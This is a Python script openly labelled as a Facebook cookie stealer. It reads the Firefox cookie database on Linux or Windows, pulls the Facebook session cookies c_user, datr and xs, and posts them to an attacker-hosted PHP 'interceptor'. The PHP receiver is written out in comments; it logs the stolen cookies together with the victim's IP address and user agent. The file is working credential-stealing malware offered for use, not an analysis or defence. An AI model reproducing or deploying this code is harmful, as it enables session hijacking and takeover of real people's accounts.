#Facebook Cookies Stealer

import os
import sqlite3
import fnmatch
import requests
import platform

#Php Interceptor to receive the cookies
WEB_SHELL = 'anubis/fb.php' #Link of Your Php Interceptor

#The Php Interceptor Code :

#<?php
#Coded By Satya Enki

#$c_user=$_REQUEST['c_user'];
#$datr=$_REQUEST['datr'];
#$xs=$_REQUEST['xs'];

#if(!empty($c_user))
#{
#$myfile=fopen("ag_cookie.txt",'a+');
#$date= date("d-m-Y h:i:sa");
#$client_ip=$_SERVER['REMOTE_ADDR'];
#$UA = $_SERVER['HTTP_USER_AGENT'];

#fwrite($myfile,"Logged At ="$date."\n");
#fwrite($myfile,"Profile = https://www.facebook.com/profile.php?id=".$c_user."\n");
#fwrite($myfile,"Picture = https://graph.facebook.com/".$c_user."/picture?type=large\n");
#fwrite($myfile,"Client ip = ".$client_ip."\n");
#fwrite($myfile,"Useragent = ".$UA."\n");
#fwrite($myfile,"datr = ".$datr."\n");
#fwrite($myfile,"xs = ".$xs."\n");
#fwrite($myfile,"----------------------------------\n\n");
#fclose($myfile);

#}
#else{
#    header('location:http://anubis'); 
#}

#?>
#Host you Php Interceptor via a Server \!/

class FbCookie():

    def greb_db_path(self):
	    #Linux OS
        if platform.system() == 'Linux':
            path = os.getenv('HOME')+"/.mozilla/firefox/"
            folder = os.listdir(path)
            for file in folder:
                if fnmatch.fnmatch(file, '*.default'):   
                    path = path+file+"/cookies.sqlite"
            return str(path)
        #Win OS
        if platform.system() == 'Windows':
            path = os.getenv('APPDATA')+"\\Mozilla\\Firefox\\Profiles\\"
            folder = os.listdir(path)
            for f in folder:
                cookie_folder = f
            path = path+cookie_folder+"\cookies.sqlite"
            return str(path)


    def post_to_shell(self, data_to_send):
        headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3'}
        payload = {'c_user': data_to_send[0], 'datr': data_to_send[1], 'xs': data_to_send[2]}
        req = requests.post(WEB_SHELL, headers=headers, data=payload)

    def greb_cookies_from_db(self):
        data_to_send = []
        db_path = self.greb_db_path()
        
        conn = sqlite3.connect(db_path)
        c = conn.cursor()

        #Query to check if there is any session stored
        c.execute("select count(*) from moz_cookies where baseDomain='facebook.com' and name='c_user'")
        for data in c.fetchall():
            count = data[0]

        #If have a session stored, grab and send to your Interceptor
        if count == 1:
            c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='c_user'")

            for data in c.fetchall():
                c_user = str(data[0])
                data_to_send.append(c_user)

            c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='datr'")
            for data in c.fetchall():
                datr = str(data[0])
                data_to_send.append(datr)

            c.execute("select value from moz_cookies where baseDomain='facebook.com' and name='xs'")
            for data in c.fetchall():
                xs = str(data[0])
                data_to_send.append(xs)

            self.post_to_shell(data_to_send)
            

def main():
    x = FbCookie()
    x.greb_cookies_from_db()

if __name__ == '__main__':
    main()